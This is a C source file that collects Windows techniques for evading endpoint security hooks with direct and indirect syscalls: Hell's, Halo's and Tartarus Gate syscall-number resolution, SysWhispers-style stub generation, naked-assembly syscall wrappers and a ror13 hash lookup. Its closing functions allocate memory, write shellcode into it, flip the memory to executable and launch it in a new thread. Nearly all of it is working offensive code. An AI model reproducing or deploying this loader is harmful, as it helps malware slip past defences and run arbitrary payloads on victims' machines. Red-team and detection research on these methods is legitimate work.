/*
 * Direct Syscalls - Hell's Gate, Halo's Gate, Tartarus Gate
 * SysWhispers patterns, indirect syscalls
 */

#include <windows.h>

// ============================================================================
// SYSCALL NUMBERS (Windows 10 21H2 x64)
// ============================================================================

#define SSN_NtAllocateVirtualMemory  0x18
#define SSN_NtProtectVirtualMemory   0x50
#define SSN_NtWriteVirtualMemory     0x3A
#define SSN_NtCreateThreadEx         0xC1
#define SSN_NtOpenProcess            0x26
#define SSN_NtClose                  0x0F
#define SSN_NtQuerySystemInformation 0x36
#define SSN_NtQueueApcThread         0x45
#define SSN_NtWaitForSingleObject    0x04

// ============================================================================
// SYSCALL STUB STRUCTURE
// ============================================================================

#pragma pack(push,1)
typedef struct {
    BYTE mov_r10_rcx[3];  // 4C 8B D1
    BYTE mov_eax[1];      // B8
    DWORD ssn;            // XX XX 00 00
    BYTE syscall[2];      // 0F 05
    BYTE ret[1];          // C3
} SYSCALL_STUB;
#pragma pack(pop)

// ============================================================================
// SYSCALL TYPEDEFS
// ============================================================================

typedef NTSTATUS (NTAPI *t_NtAVM)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *t_NtPVM)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *t_NtWVM)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *t_NtCTE)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *t_NtOP)(PHANDLE, ACCESS_MASK, PVOID, PCLIENT_ID);

// ============================================================================
// HELL'S GATE - Extract SSN from ntdll
// ============================================================================

DWORD hells_gate(PVOID fn)
{
    BYTE* p = (BYTE*)fn;

    // Clean syscall stub pattern:
    // 4C 8B D1       mov r10, rcx
    // B8 XX XX 00 00 mov eax, SSN
    // 0F 05          syscall
    // C3             ret

    if(p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 &&
       p[3] == 0xB8 && p[6] == 0x00 && p[7] == 0x00) {
        return *(DWORD*)(p + 4);
    }

    return 0;  // Hooked
}

// ============================================================================
// HALO'S GATE - Walk neighbors if hooked
// ============================================================================

DWORD halos_gate(PVOID fn)
{
    BYTE* p = (BYTE*)fn;

    // Try clean extraction first
    DWORD ssn = hells_gate(fn);
    if(ssn) return ssn;

    // Function hooked - check neighbors
    // Syscall stubs are typically 32 bytes apart

    for(int i = 1; i < 500; i++) {
        // Check UP (lower address)
        BYTE* up = p - (32 * i);
        if(up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
            ssn = *(DWORD*)(up + 4);
            return ssn + i;  // Our SSN is neighbor's + distance
        }

        // Check DOWN (higher address)
        BYTE* dn = p + (32 * i);
        if(dn[0] == 0x4C && dn[1] == 0x8B && dn[2] == 0xD1 && dn[3] == 0xB8) {
            ssn = *(DWORD*)(dn + 4);
            return ssn - i;  // Our SSN is neighbor's - distance
        }
    }

    return 0;
}

// ============================================================================
// TARTARUS GATE - Multi-hook detection
// ============================================================================

DWORD tartarus_gate(PVOID fn)
{
    BYTE* p = (BYTE*)fn;

    // Detect various hook patterns:
    // E9 XX XX XX XX = JMP rel32
    // EB XX          = JMP rel8
    // FF 25 XX XX XX XX = JMP [rip+disp32]
    // 0F 1F XX       = NOP with ModRM

    if(p[0] == 0xE9 || p[0] == 0xEB ||
       (p[0] == 0xFF && p[1] == 0x25) ||
       (p[0] == 0x0F && p[1] == 0x1F)) {
        return halos_gate(fn);
    }

    // Not hooked
    return hells_gate(fn);
}

// ============================================================================
// RECYCLED GATE - Use clean syscall from different function
// ============================================================================

typedef struct {
    PVOID syscall_addr;  // Address of syscall instruction
    PVOID ret_addr;      // Address of ret instruction
} SYSCALL_GADGET;

SYSCALL_GADGET find_syscall_gadget(void)
{
    SYSCALL_GADGET g = {0, 0};
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE* p = (BYTE*)ntdll;

    // Scan for syscall; ret (0F 05 C3)
    for(DWORD i = 0; i < 0x200000; i++) {
        if(p[i] == 0x0F && p[i+1] == 0x05 && p[i+2] == 0xC3) {
            g.syscall_addr = p + i;
            g.ret_addr = p + i + 2;
            break;
        }
    }

    return g;
}

// ============================================================================
// SYSWHISPERS PATTERN - Runtime stub generation
// ============================================================================

void build_syscall_stub(BYTE* stub, DWORD ssn)
{
    // mov r10, rcx
    stub[0] = 0x4C;
    stub[1] = 0x8B;
    stub[2] = 0xD1;

    // mov eax, SSN
    stub[3] = 0xB8;
    *(DWORD*)(stub + 4) = ssn;

    // syscall
    stub[8] = 0x0F;
    stub[9] = 0x05;

    // ret
    stub[10] = 0xC3;
}

// Build indirect syscall stub (jumps to ntdll for syscall instruction)
void build_indirect_stub(BYTE* stub, DWORD ssn, PVOID syscall_addr)
{
    // mov r10, rcx
    stub[0] = 0x4C;
    stub[1] = 0x8B;
    stub[2] = 0xD1;

    // mov eax, SSN
    stub[3] = 0xB8;
    *(DWORD*)(stub + 4) = ssn;

    // jmp syscall_addr
    stub[8] = 0xFF;
    stub[9] = 0x25;
    *(DWORD*)(stub + 10) = 0;  // RIP-relative offset
    *(PVOID*)(stub + 14) = syscall_addr;
}

// ============================================================================
// SYSCALL TABLE
// ============================================================================

typedef struct {
    DWORD hash;
    DWORD ssn;
    PVOID addr;
    BYTE  stub[24];
} SYSCALL_ENTRY;

SYSCALL_ENTRY g_syscalls[32];
int g_syscall_count = 0;

// Hash function
#define ROR(x,n) (((x)>>(n))|((x)<<(32-(n))))
DWORD ror13(char* s)
{
    DWORD h = 0;
    while(*s) { h = ROR(h, 13); h += *s++; }
    return h;
}

// Resolve all syscalls
void init_syscalls(void)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    SYSCALL_GADGET gadget = find_syscall_gadget();

    char* funcs[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtOpenProcess",
        "NtClose",
        "NtQueueApcThread",
        "NtWaitForSingleObject",
        0
    };

    for(int i = 0; funcs[i]; i++) {
        PVOID addr = GetProcAddress(ntdll, funcs[i]);
        if(!addr) continue;

        g_syscalls[g_syscall_count].hash = ror13(funcs[i]);
        g_syscalls[g_syscall_count].addr = addr;
        g_syscalls[g_syscall_count].ssn = tartarus_gate(addr);

        // Build indirect stub
        build_indirect_stub(
            g_syscalls[g_syscall_count].stub,
            g_syscalls[g_syscall_count].ssn,
            gadget.syscall_addr
        );

        g_syscall_count++;
    }
}

// Get syscall stub
PVOID get_syscall(DWORD hash)
{
    for(int i = 0; i < g_syscall_count; i++) {
        if(g_syscalls[i].hash == hash)
            return g_syscalls[i].stub;
    }
    return 0;
}

// ============================================================================
// DIRECT SYSCALL STUBS (MSVC inline)
// ============================================================================

#ifdef _WIN64

__declspec(naked) NTSTATUS Sys_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    __asm {
        mov r10, rcx
        mov eax, SSN_NtAllocateVirtualMemory
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS Sys_NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect)
{
    __asm {
        mov r10, rcx
        mov eax, SSN_NtProtectVirtualMemory
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS Sys_NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten)
{
    __asm {
        mov r10, rcx
        mov eax, SSN_NtWriteVirtualMemory
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS Sys_NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList)
{
    __asm {
        mov r10, rcx
        mov eax, SSN_NtCreateThreadEx
        syscall
        ret
    }
}

#endif

// ============================================================================
// USAGE PATTERNS
// ============================================================================

// Allocate RWX via direct syscall
PVOID alloc_rwx(DWORD sz)
{
    PVOID base = 0;
    SIZE_T size = sz;

    Sys_NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &size, 0x3000, 0x40);

    return base;
}

// Allocate RW, write, protect RX (two-stage)
PVOID alloc_staged(BYTE* sc, DWORD len)
{
    PVOID base = 0;
    SIZE_T size = len;
    ULONG old;

    // Allocate RW
    Sys_NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &size, 0x3000, 0x04);

    // Write shellcode
    Sys_NtWriteVirtualMemory((HANDLE)-1, base, sc, len, 0);

    // Change to RX
    Sys_NtProtectVirtualMemory((HANDLE)-1, &base, &size, 0x20, &old);

    return base;
}

// Execute via direct syscall thread creation
void exec_syscall(BYTE* sc, DWORD len)
{
    PVOID p = alloc_staged(sc, len);

    HANDLE ht;
    Sys_NtCreateThreadEx(&ht, 0x1FFFFF, 0, (HANDLE)-1, p, 0, 0, 0, 0, 0, 0);
}

// ============================================================================
// DYNAMIC SSN RESOLUTION (runtime)
// ============================================================================

typedef struct {
    DWORD ssn;
    BOOL  resolved;
} DYN_SSN;

DYN_SSN g_dyn_ssn[16];

void resolve_ssn_runtime(int idx, char* fn_name)
{
    if(g_dyn_ssn[idx].resolved) return;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PVOID addr = GetProcAddress(ntdll, fn_name);

    g_dyn_ssn[idx].ssn = tartarus_gate(addr);
    g_dyn_ssn[idx].resolved = TRUE;
}

// ============================================================================
// EOF
// ============================================================================
